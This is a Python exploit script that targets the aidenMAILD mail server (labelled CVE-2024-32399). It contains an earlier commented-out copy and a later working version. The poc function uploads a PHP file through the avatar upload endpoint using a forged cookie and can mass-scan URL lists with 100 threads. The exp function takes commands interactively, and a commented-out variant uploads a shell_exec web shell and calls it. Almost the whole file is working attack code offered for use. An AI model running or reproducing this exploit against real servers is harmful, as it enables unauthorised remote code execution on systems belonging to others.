# import sys
# import argparse
# import requests
# import logging
# from multiprocessing.dummy import Pool
#
# requests.packages.urllib3.disable_warnings()
#
#
# def banner():
#     banner = r"""
#          .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.
# | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
# | |   _____      | || |      __      | || |  ____  ____  | || |  ___  ____   | || |  _________   | || |  _________   | || | _____  _____ | |
# | |  |_   _|     | || |     /  \     | || | |_  _||_  _| | || | |_  ||_  _|  | || | |_   ___  |  | || | |_   ___  |  | || ||_   _||_   _|| |
# | |    | |       | || |    / /\ \    | || |   \ \  / /   | || |   | |_/ /    | || |   | |_  \_|  | || |   | |_  \_|  | || |  | |    | |  | |
# | |    | |   _   | || |   / ____ \   | || |    \ \/ /    | || |   |  __'.    | || |   |  _|  _   | || |   |  _|      | || |  | '    ' |  | |
# | |   _| |__/ |  | || | _/ /    \ \_ | || |    _|  |_    | || |  _| |  \ \_  | || |  _| |___/ |  | || |  _| |_       | || |   \ `--' /   | |
# | |  |________|  | || ||____|  |____|| || |   |______|   | || | |____||____| | || | |_________|  | || | |_____|      | || |    `.__.'    | |
# | |              | || |              | || |              | || |              | || |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
#                                                                                                                         made by fanadd
#                                                                                                                         2024/9/8
#
#
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="aidenMAILD 邮件服务器 路径遍历漏洞(CVE-2024-32399)")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         # if poc(args.url):
#         #     exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         print(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/admin/users/upavatar.html"
#     headers = {
#         "Content-Length": "198",
#         "Accept": "application/json,text/javascript,*/*;q=0.01",
#         "X-Requested-With": "XMLHttpRequest",
#         "User-Agent": "Mozilla/5.0(WindowsNT6.1;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/107.0.0.0Safari/537.36Edg/107.0.1418.26",
#         "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR",
#         "Accept-Encoding": "gzip,deflate",
#         "Accept-Language": "zh-CN,zh;q=0.9",
#         "Cookie": "user_name=1;user_id=3",
#         "sec-ch-ua-mobile": "?0",
#         "Connection": "close",
#     }
#     data = ('------WebKitFormBoundary3OCVBiwBVsNuB2kR\r\nContent-Disposition: form-data; name="file"; '
#             'filename="1.php"\r\nContent-Type: image/png\r\n\r\n<?php phpinfo('
#             ');?>\r\n------WebKitFormBoundary3OCVBiwBVsNuB2kR--')
#     proxies = {
#         'http': 'http://127.0.0.1:8080',
#         'https': 'http://127.0.0.1:8080',
#     }
#     try:
#         res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False,proxies=proxies)
#         if res1.status_code == 200 and "error" not in res1.text:
#             print(f"[+] {target} 存在漏洞")
#             with open("vuln_url.txt", 'a') as f:
#                 f.write(target + '\n')
#                 f.close()
#         else:
#             print(f"[-] {target} 不存在漏洞")
#     except Exception as e:
#         print(f"[-] 该 {target} 请求失败: {e}")
#
#
# if __name__ == '__main__':
#     main()
import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei                                                                                   made by fanadd
                                                                                                                        2024/9/8


    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="aidenMAILD 邮件服务器 路径遍历漏洞(CVE-2024-32399)")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/admin/users/upavatar.html"
    headers = {
        "Content-Length": "198",
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0(WindowsNT6.1;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/107.0.0.0Safari/537.36Edg/107.0.1418.26",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "user_name=1;user_id=3",
        "sec-ch-ua-mobile": "?0",
        "Connection": "close",
    }
    data = ('------WebKitFormBoundary3OCVBiwBVsNuB2kR\r\nContent-Disposition: form-data; name="file"; '
            'filename="1.php"\r\nContent-Type: image/png\r\n\r\n<?php phpinfo('
            ');?>\r\n------WebKitFormBoundary3OCVBiwBVsNuB2kR--')
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, proxies=proxies)
        if res1.status_code == 200 and "error" not in res1.text:
            logger.info(f"[+] {target} 存在漏洞")
            with open("vuln_url.txt", 'a') as f:
                f.write(target + '\n')
            return True
        else:
            logger.info(f"[-] {target} 不存在漏洞")
            return False
    except Exception as e:
        logger.error(f"[-] 该 {target} 请求失败: {e}")
        return False


def exp(target):
    while True:
        cmd = input("请输入要执行的命令（输入 q 退出）：")
        if cmd == "q":
            logger.info("正在退出,请等候……")
            break
        try:
            payload = f"/admin/users/upavatar.html?cmd={cmd}"
            headers = {
                "Content-Length": "198",
                "Accept": "application/json,text/javascript,*/*;q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0(WindowsNT6.1;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/107.0.0.0Safari/537.36Edg/107.0.1418.26",
                "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR",
                "Accept-Encoding": "gzip,deflate",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Cookie": "user_name=1;user_id=3",
                "sec-ch-ua-mobile": "?0",
                "Connection": "close",
            }
            data = ('------WebKitFormBoundary3OCVBiwBVsNuB2kR\r\nContent-Disposition: form-data; name="file"; '
                    'filename="1.php"\r\nContent-Type: image/png\r\n\r\n"' + cmd + '"\r\n------WebKitFormBoundary3OCVBiwBVsNuB2kR--')
            proxies = {
                'http': 'http://127.0.0.1:8080',
                'https': 'http://127.0.0.1:8080',
            }
            res2 = requests.post(url=target + payload, data=data, headers=headers, verify=False, proxies=proxies)
            if res2.status_code == 200:
                logger.info(res2.text)
                print("执行成功,请将php文件路径拼接到url后面进行访问")
            else:
                logger.error(f"[-] 请求 {target} 失败")
        except Exception as e:
            logger.error(f"[-] 请求 {target} 时发生错误: {e}")

        # def exp(target):
        #     while True:
        #         cmd = input("请输入要执行的命令（输入 q 退出）：")
        #         if cmd == "q":
        #             logger.info("正在退出,请等候……")
        #             break
        #         try:
        #             payload = "/admin/users/upavatar.html"
        #             headers = {
        #                 "Content-Length": "198",
        #                 "Accept": "application/json,text/javascript,*/*;q=0.01",
        #                 "X-Requested-With": "XMLHttpRequest",
        #                 "User-Agent": "Mozilla/5.0(WindowsNT6.1;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/107.0.0.0Safari/537.36Edg/107.0.1418.26",
        #                 "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR",
        #                 "Accept-Encoding": "gzip,deflate",
        #                 "Accept-Language": "zh-CN,zh;q=0.9",
        #                 "Cookie": "user_name=1;user_id=3",
        #                 "sec-ch-ua-mobile": "?0",
        #                 "Connection": "close",
        #             }
        #             data = ('------WebKitFormBoundary3OCVBiwBVsNuB2kR\r\nContent-Disposition: form-data; name="file"; '
        #                     'filename="1.php"\r\nContent-Type: image/png\r\n\r\n<?php echo shell_exec("' + cmd + '"); ?>\r\n------WebKitFormBoundary3OCVBiwBVsNuB2kR--')
        #             proxies = {
        #                 'http': 'http://127.0.0.1:8080',
        #                 'https': 'http://127.0.0.1:8080',
        #             }
        #             res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False,
        #                                  proxies=proxies)
        #             if res1.status_code == 200:
        #                 import json
        #                 response_data = json.loads(res1.text)
        #                 file_path = response_data['data']['src']
        #                 res2 = requests.get(url=target + file_path + f"?cmd={cmd}", verify=False, proxies=proxies)
        #                 if res2.status_code == 200:
        #                     logger.info(res2.text)
        #                 else:
        #                     logger.error(f"[-] 请求 {target} 失败")
        #             else:
        #                 logger.error(f"[-] 请求 {target} 失败")
        #         except Exception as e:
        #             logger.error(f"[-] 请求 {target} 时发生错误: {e}")


if __name__ == '__main__':
    main()
